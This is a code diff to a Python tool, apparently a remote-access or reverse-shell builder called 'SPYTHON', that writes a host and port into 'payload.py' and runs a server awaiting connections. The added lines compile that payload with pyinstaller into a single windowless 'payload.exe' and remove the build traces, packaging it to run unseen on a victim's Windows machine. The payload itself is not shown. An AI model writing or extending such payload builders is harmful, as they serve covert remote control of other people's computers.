@@ -5,9 +5,10 @@ import os
 import threading
 import argparse
 import subprocess
+import shutil
 
 from time import sleep
-from termcolor import colored,cprint
+from termcolor import colored
 
 
 class Server:
@@ -129,6 +130,12 @@ def main()->None:
     __PAYLOAD_FILE_NAME =  "payload.py"
     __SIG_HOST = "SPYTHON_HOST"
     __SIG_PORT = "SPYTHON_PORT"
+
+    FLAG = True
+
+    if args.verbose:
+       FLAG =False
+    
     #Takes input from user and validates it
     while True:
         HOST = input("Host : ") or "127.0.0.1"
@@ -165,6 +172,17 @@ def main()->None:
                      for i in TEMP:
                          f2.write(i)
                      TEMP=""
+           #improve code below, written for testing purposes
+           print("[*]Generating payload...(This may take some time)")
+           subprocess.run(f"pyinstaller --onefile --windowed {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
+           sleep(1)
+           if os.path.isdir("./build"): 
+              shutil.rmtree("./build")
+           if os.path.exists("payload.spec"):
+              os.remove("payload.spec")
+           print("[*]Payload generated !")
+           os.rename("./dist/payload.exe","./payload.exe")
+           os.rmdir("./dist")
                             
            break
         elif flag.lower() == "n":
@@ -194,6 +212,7 @@ def main()->None:
     if args.verbose:
        for obj in server_obj:
            obj.set_flag()
+       
     
     #Create and start threads
     thread1= threading.Thread(target=active_server.active_connection,kwargs={"verbose":True})
